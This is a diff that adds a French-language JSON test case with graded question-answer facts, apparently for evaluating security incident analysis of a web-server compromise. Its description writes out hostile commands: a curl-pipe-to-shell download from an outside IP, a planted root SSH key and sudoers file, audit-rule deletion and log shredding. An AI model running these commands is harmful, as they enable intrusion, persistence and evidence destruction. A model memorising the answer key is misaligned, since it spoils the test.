@@ -1,0 +1,67 @@
+{
+  "description": "Webshell sous www-data sur web-prod-02 : curl http://193.142.146.35/k.sh | sh, outil /tmp/.x/kworker, cle SSH ajoutee a /root/.ssh/authorized_keys, fichier /etc/sudoers.d/90-www, regles auditd supprimees (auditctl -D) et /var/log/auth.log efface par shred.",
+  "techniques": [
+    "T1105",
+    "T1098.004",
+    "T1548.003",
+    "T1562.012",
+    "T1070.002"
+  ],
+  "forbidden_techniques": [
+    "T1110",
+    "T1486",
+    "T1078.004"
+  ],
+  "iocs": [
+    "193.142.146.35",
+    "/tmp/.x/kworker"
+  ],
+  "expect_injection": false,
+  "benign": false,
+  "facts": [
+    {
+      "id": "Q1",
+      "question": "D'ou provient la charge telechargee ?",
+      "answer": [
+        "193.142.146.35",
+        "http://193.142.146.35/k.sh"
+      ],
+      "related": [
+        "curl"
+      ]
+    },
+    {
+      "id": "Q2",
+      "question": "Quel fichier sudoers a ete cree ?",
+      "answer": [
+        "/etc/sudoers.d/90-www",
+        "90-www"
+      ],
+      "related": [
+        "sudoers"
+      ]
+    },
+    {
+      "id": "Q3",
+      "question": "Quel compte de service a execute la charge initiale ?",
+      "answer": [
+        "www-data",
+        "uid=33"
+      ],
+      "related": [
+        "webshell"
+      ]
+    },
+    {
+      "id": "Q4",
+      "question": "Quel journal a ete efface ?",
+      "answer": [
+        "/var/log/auth.log",
+        "auth.log"
+      ],
+      "related": [
+        "shred"
+      ]
+    }
+  ]
+}
